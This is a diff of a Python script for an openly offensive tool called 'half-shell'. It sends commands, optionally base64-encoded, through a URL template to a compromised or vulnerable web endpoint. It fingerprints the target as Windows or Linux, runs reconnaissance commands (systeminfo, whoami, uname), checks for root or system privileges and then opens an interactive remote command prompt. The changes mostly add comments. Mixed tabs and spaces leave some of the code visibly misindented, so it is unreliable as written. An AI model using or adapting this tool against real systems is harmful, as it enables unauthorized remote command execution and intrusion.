@@ -35,39 +35,52 @@ def shell(argv):
     url = argv[1]
     cmd = "echo thisistest"
 
+    #If an encoding was given
     if len(argv) == 3:
-        cmd = base64.b64encode(cmd)
+        
+	#Just accepts base64 right now, will update with other options later
+	cmd = base64.b64encode(cmd)
         response = requests.get(url.format(cmd)).text
-        extras = response.split("thisistest\n")
+        
+	#Getting extra data that would surround command responses, will be removed later
+	extras = response.split("thisistest\n")
 	if len(extras) == 3:
 		extras = [extras[0],extras[2]]
 	
 	cmd = base64.b64encode('dir')
         response = requests.get(url.format(cmd)).text
-		
+	
+	#If it's a Windows target
 	if "Directory" in response:
             cmd = base64.b64encode('systeminfo | findstr Name | findstr /V Connection && whoami && cd')
             response = requests.get(url.format(cmd)).text
-            for extra in extras:
+            
+	    #Removing the extra data at the beginning/end of cmd results
+	    for extra in extras:
                 response = response.replace(extra,"")
             print("\nTarget Information:")
             print(response)
-        else:
+        
+	#If it's a Linux target
+	else:
             cmd = base64.b64encode('uname -a && whoami && pwd')
             response = requests.get(url.format(cmd)).text
-            for extra in extras:
+            
+	    #Removing the extra data at the beginning/end of cmd results
+	    for extra in extras:
                 response = response.replace(extra,"")
             print("\nTarget Information:")
             print(response)
-        if 'system' in response or 'root' in response:
+        
+	if 'system' in response or 'root' in response:
             print("You are running as a privileged user...")
             prompt = "half-shell#> "
         else:
             prompt = "half-shell$> "
         print("Type '(q)uit' or '(e)xit' to exit...\n")
 
-        while True:
-            cmd = raw_input(prompt)
+        while True:    
+	cmd = raw_input(prompt)
             if cmd.lower() == "quit" or cmd.lower() == "exit" or cmd.lower()== "q" or cmd.lower() == "e":
                 sys.exit()
             cmd = base64.b64encode(cmd)
@@ -76,21 +89,39 @@ def shell(argv):
                 response = response.replace(extra,"")
             print(response)
 
+    #If no encoding is used
     else:
         response = requests.get(url.format(cmd)).text
-        extras = response.split("thisistest")
+        
+	#Getting extra data that would surround command responses, will be removed later
+	extras = response.split("thisistest")
         if len(extras) == 3:
                 extras = [extras[0],extras[2]]
         cmd = 'dir && pwd'
         response = requests.get(url.format(cmd)).text
-        if "Directory" in response:
+        
+	#If it's a Windows target
+	if "Directory" in response:
             cmd = 'systeminfo | findstr Name | findstr /V Connection && whoami && cd'
             response = requests.get(url.format(cmd)).text
+        
+	    #Removing the extra data at the beginning/end of cmd results
+	    for extra in extras:
+                response = response.replace(extra,"")
+            print("\nTarget Information:")
             print(response)
-        else:
+	
+	#f it's a Linux target
+	else:
             cmd = 'uname -a && whoami && pwd'
             response = requests.get(url.format(cmd)).text
+	
+	    #Removing the extra data at the beginning/end of cmd results
+	    for extra in extras:
+                response = response.replace(extra,"")
+            print("\nTarget Information:")
             print(response)
+
         if 'system' in response or 'root' in response:
             print("You are running as a privileged user...")
             prompt = "half-shell#> "
